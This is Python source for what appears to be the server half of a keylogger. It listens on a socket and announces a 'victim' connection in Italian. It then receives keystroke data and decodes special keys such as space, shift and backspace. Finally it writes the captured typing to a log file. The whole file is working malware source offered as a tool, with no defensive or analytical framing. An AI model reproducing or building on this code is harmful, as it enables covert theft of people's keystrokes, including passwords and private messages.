import socket as s


class Server:
    def __init__(self):
        # Set var
        self.host = "localhost"
        self.port = 8080
        self.server = s.socket()

        # Bind ip and port to the server
        self.server.bind((self.host, self.port))
        # Start the server
        self.set_server()

    def tras_data(self, data, file):
        if data == "Key.space":
            return " "
        elif data == "Key.shift":
            return "[S]>"
        elif data == "Key.backspace":
            return "<[D]"
        data = data.removeprefix("'")
        data = data.removesuffix("'")
        return data

    # Function to start server and start listen message from client
    def set_server(self):
        print("Server creato")
        self.server.listen()
        print("Server in ascolto")
        conn, add = self.server.accept()
        file = open("logs.txt", "a")
        i = True
        print(f"<-----------Vittima trovata, connessione stabilita! info: {add}----------->")
        with file:
            with conn:
                while True:
                    data = conn.recv(1024)
                    data = data.decode()
                    if not data:
                        print("conn not valid")
                        self.set_server()
                        break
                    if i:
                        file.write(f"{data}\n")
                        i = False
                    else:
                        file.write(self.tras_data(data, file))


if __name__ == "__main__":
    Server()
